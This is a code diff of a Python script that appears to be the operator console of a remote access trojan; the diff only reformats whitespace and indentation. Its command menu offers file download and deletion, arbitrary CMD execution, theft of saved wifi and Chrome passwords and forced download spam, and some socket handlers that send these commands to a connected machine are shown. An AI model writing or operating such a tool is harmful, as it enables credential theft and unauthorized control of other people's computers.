@@ -15,24 +15,25 @@ print(addr, "Has connected\n")
 
 while True:
 
-    print("1: View cwd\n"
-          "2: View custom Dir\n"
-          "3: Download File \n"
-          "4: Delete File \n"
-          "5: Delete Dir  \n"
-          "6: Create File \n"
-          "7: Return ipconfig (TODO...) \n"
-          "8: Execute custom CMD command \n"
-          "9: Shut it down -MC Hammer \n"
-          "10: Get wifiPassword list  \n"
-          "11: Get Chrome passwords  \n"
-          "12: Spam download URL  \n"
-          )
+    print(
+        "1: View cwd\n"
+        "2: View custom Dir\n"
+        "3: Download File \n"
+        "4: Delete File \n"
+        "5: Delete Dir  \n"
+        "6: Create File \n"
+        "7: Return ipconfig (TODO...) \n"
+        "8: Execute custom CMD command \n"
+        "9: Shut it down -MC Hammer \n"
+        "10: Get wifiPassword list  \n"
+        "11: Get Chrome passwords  \n"
+        "12: Spam download URL  \n"
+    )
     print()
     command = input(str("command >> "))
 
     if command == "1":
-        # Print Current Working Directory (CWD) 
+        # Print Current Working Directory (CWD)
         conn.send(command.encode())  # send 1
         files = conn.recv()  # get response
         files = files.decode()  # decode response
@@ -47,7 +48,7 @@ while True:
         print("Custom dir: ", files)
 
     elif command == "3":
-        # Download a file 
+        # Download a file
         conn.send(command.encode())
         filePath = input(str(" please enter the files path: "))
         conn.send(filePath.encode())
@@ -79,8 +80,6 @@ while True:
         conn.send(input(str("Enter data to write: ")).encode())
         result = conn.recv().decode()
         print(result)
-
-
 
     elif command == "7":
         # Get ipconfig
